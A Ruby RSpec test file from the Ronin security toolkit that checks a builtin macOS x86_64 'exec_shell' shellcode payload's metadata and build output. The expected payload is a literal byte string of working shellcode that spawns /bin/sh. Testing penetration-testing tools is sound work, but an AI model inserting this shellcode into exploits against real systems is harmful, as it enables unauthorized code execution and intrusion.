require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/macos/x86_64/exec_shell'

describe Ronin::Payloads::Shellcode::MacOS::X86_64::ExecShell do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/macos/x86_64/exec_shell'" do
      expect(subject.id).to eq('shellcode/macos/x86_64/exec_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :macos" do
      expect(subject.os).to be(:macos)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x48\x31\xd2\x48\xc7\xc0\xf6\xff\xff\x01\x48\x83\xc0\x45\x5f\x52\x57\x48\x89\xe6\x0f\x05\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
